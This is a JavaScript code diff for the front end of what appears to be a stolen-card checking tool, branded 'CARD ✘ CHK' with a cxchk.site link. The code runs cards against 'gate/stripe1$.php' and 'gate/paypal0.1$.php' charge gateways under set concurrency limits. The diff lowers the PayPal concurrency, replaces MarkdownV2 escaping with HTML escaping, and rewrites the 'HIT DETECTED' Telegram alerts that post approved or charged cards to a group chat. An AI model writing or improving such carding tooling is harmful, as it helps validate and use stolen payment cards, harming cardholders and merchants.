@@ -28,8 +28,8 @@ document.addEventListener('DOMContentLoaded', function() {
         if (selectedGateway === 'gate/stripe1$.php') {
             maxConcurrent = 10; // 10 concurrent requests for Stripe 1$             console.log(`Set maxConcurrent to 10 for ${selectedGateway}`);
         } else if (selectedGateway === 'gate/paypal0.1$.php') {
-            maxConcurrent = 2; // 5 concurrent requests for PayPal
-            console.log(`Set maxConcurrent to 5 for ${selectedGateway}`);
+            maxConcurrent = 2; // 2 concurrent requests for PayPal
+            console.log(`Set maxConcurrent to 2 for ${selectedGateway}`);
         } else {
             maxConcurrent = 3; // 3 concurrent requests for all other gateways
             console.log(`Set maxConcurrent to 3 for ${selectedGateway}`);
@@ -117,9 +117,16 @@ document.addEventListener('DOMContentLoaded', function() {
         return isApiKeyValid;
     }
 
-    // Function to escape text for MarkdownV2
-    function escapeMarkdownV2(text) {
-        return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
+    // Function to escape text for HTML
+    function escapeHtml(text) {
+        const map = {
+            '&': '&amp;',
+            '<': '&lt;',
+            '>': '&gt;',
+            '"': '&quot;',
+            "'": '&#039;'
+        };
+        return text.replace(/[&<>"']/g, m => map[m]);
     }
 
     // Function to send Telegram notification for approved/charged cards
@@ -134,25 +141,25 @@ document.addEventListener('DOMContentLoaded', function() {
         // Format status with emoji
         const statusEmoji = status === 'CHARGED' ? '🔥' : '✅';
         
-        // Escape all text for MarkdownV2
-        const escapedUserName = escapeMarkdownV2(userName);
-        const escapedGateway = escapeMarkdownV2(selectedGateway.replace('gate/', '').replace('.php', ''));
-        const escapedResponse = escapeMarkdownV2(response);
+        // Escape all text for HTML
+        const escapedUserName = escapeHtml(userName);
+        const escapedGateway = escapeHtml(selectedGateway.replace('gate/', '').replace('.php', ''));
+        const escapedResponse = escapeHtml(response);
         
-        // Create the beast-level message
-        const message = `✦━━━\\[ 𝐇𝐈𝐓 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃! \\]━━━✦\\n` +
-                       `\\[⌇\\]\\(${userProfileUrl}\\) 𝐔𝐬𝐞𝐫 ➳ \\[${escapedUserName}\\]\\(${userProfileUrl}\\)\\n` +
-                       `\\[⌇\\]\\(${userProfileUrl}\\) 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ ${escapedGateway}\\n` +
-                       `\\[⌇\\]\\(${userProfileUrl}\\) 𝐒𝐭𝐚𝐭𝐮𝐬 ➳ ${statusEmoji}\\n` +
-                       `\\[⌇\\]\\(${userProfileUrl}\\) 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ _${escapedResponse}_\\n` +
-                       `――――――――――――――\\n` +
-                       `\\[⌇\\]\\(${userProfileUrl}\\) 𝐇𝐈𝐓 𝐕𝐈𝐀 ➳ \\[𝑪𝑨𝑹𝑫 ✘ 𝑪𝑯𝑲\\]\\(https://cxchk.site\\)`;
+        // Create a simpler HTML message
+        const message = `<b>✦━━━[ 𝐇𝐈𝐓 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃! ]━━━✦</b>\n` +
+                       `<a href="${userProfileUrl}">𝐔𝐬𝐞𝐫 ➳ ${escapedUserName}</a>\n` +
+                       `𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ ${escapedGateway}\n` +
+                       `𝐒𝐭𝐚𝐭𝐮𝐬 ➳ ${statusEmoji}\n` +
+                       `𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <i>${escapedResponse}</i>\n` +
+                       `<b>――――――――――――――</b>\n` +
+                       `<a href="https://cxchk.site">𝐇𝐈𝐓 𝐕𝐈𝐀 ➳ 𝑪𝑨𝑹𝑫 ✘ 𝑪𝑯𝑲</a>`;
         
         // Prepare data for API call
         const telegramData = {
             chat_id: '-1003044358879', // Your actual group chat ID
             text: message,
-            parse_mode: 'MarkdownV2'
+            parse_mode: 'HTML'
         };
         
         // Send notification to your backend
